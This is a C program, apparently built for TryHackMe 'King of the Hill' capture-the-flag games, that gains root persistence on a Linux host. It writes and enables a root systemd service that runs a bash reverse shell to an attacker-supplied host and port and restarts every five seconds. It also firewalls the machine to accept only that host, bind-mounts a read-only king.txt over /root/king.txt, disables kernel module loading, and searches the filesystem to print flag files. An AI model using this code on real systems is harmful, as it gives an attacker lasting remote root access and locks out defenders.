#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void SystemdPersistence(const char *lhost, const char *lport) {
    FILE *file = fopen("/etc/systemd/system/persistence.service", "w");
    if (!file) {
        perror("Error opening persistence.service");
        return;
    }

    fprintf(file, "[Unit]\n");
    fprintf(file, "Description= Systemd Persistence\n\n");
    fprintf(file, "[Service]\n");
    fprintf(file, "User=root\n");
    fprintf(file, "Group=root\n");
    fprintf(file, "WorkingDirectory=/root\n");
    fprintf(file, "ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'\n", lhost, lport);
    fprintf(file, "Restart=always\n");
    fprintf(file, "RestartSec=5\n\n");
    fprintf(file, "[Install]\n");
    fprintf(file, "WantedBy=multi-user.target\n");

    fclose(file);
}

void flags(){
    printf("Finding flags...\n");
    system("find / -name \"*flag.txt\" -o -name \".flag*\" -exec cat {} \\; 2>/dev/null > temp_flags.txt");
    system("find / -name \".flag\" -o -name \"flag\" -exec cat {} \\; 2>/dev/null >> temp_flags.txt");
    system("find / -name \"user.txt\" -exec cat {} \\; 2>/dev/null >> temp_flags.txt");
    system("find / -name \"root.txt\" -exec cat {} \\; 2>/dev/null >> temp_flags.txt");
    system("grep -r \"THM{\" / >> temp_flags.txt 2>/dev/null");
    FILE *flagsFile = fopen("temp_flags.txt", "r");
    if (flagsFile) {
        fseek(flagsFile, 0, SEEK_END);
        long fileSize = ftell(flagsFile);
        fclose(flagsFile);

        if (fileSize > 0) {
            printf("All flags Found\n");
        } else {
            printf("No flags found\n");
        }
    } else {
        printf("Error opening temp_flags.txt\n");
    }
    printf("Here is your flags.\n");
    system("cat temp_flags.txt");
}

void EnablePersistence() {
    system("systemctl enable persistence.service");
    system("systemctl start persistence");
}

int main(int argc, char **argv)
{
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <lhost> <lport> <username>\n", argv[0]);
        return 1;
    }
    char *lhost = argv[1];
    char *lport = argv[2];
    char *username = argv[3];
    char ufw_commands[1000];
    snprintf(ufw_commands, sizeof(ufw_commands), "sudo ufw allow from %s && sudo ufw deny from all && sudo ufw enable && sudo ufw reload", lhost);
    char kinger[4096];
    snprintf(kinger, sizeof(kinger), "sudo lessecho %s > /root/king.txt & sudo dd if=/dev/zero of=/dev/shm/root_f bs=1000 count=100 & sudo mkfs.ext3 /dev/shm/root_f & sudo mkdir /dev/shm/sqashfs & sudo mount -o loop /dev/shm/root_f /dev/shm/sqashfs/ & sudo chmod -R 777 /dev/shm/sqashfs/ & sudo lessecho %s > /dev/shm/sqashfs/king.txt & sudo mount -o ro,remount /dev/shm/sqashfs & sudo mount -o bind /dev/shm/sqashfs/king.txt /root/king.txt & sudo rm -rf /dev/shm/root_f", username);
    system(ufw_commands);
    system(kinger);
    system("cd / && chattr -ia root");
    system("sudo sysctl -w kernel.modules_disabled=1");
    const char *message = "[*] setup completed! [*]";
    for (int i = 0; i < strlen(message); i++) {
        printf("%c", message[i]);
        fflush(stdout);
    }
    printf("\n");
    system("clear");
    const char *msg = "[*] Activating the service [*]";
    printf("\n");
    system("clear");
    const char *scs = "[*] Success! [*]";
    for (int i = 0; i < strlen(scs); i++) {
        printf("%c", scs[i]);
        fflush(stdout);
    }
    printf("\n");
    system("clear");
    SystemdPersistence(lhost, lport);
    EnablePersistence();
    flags();
    return 0;
}
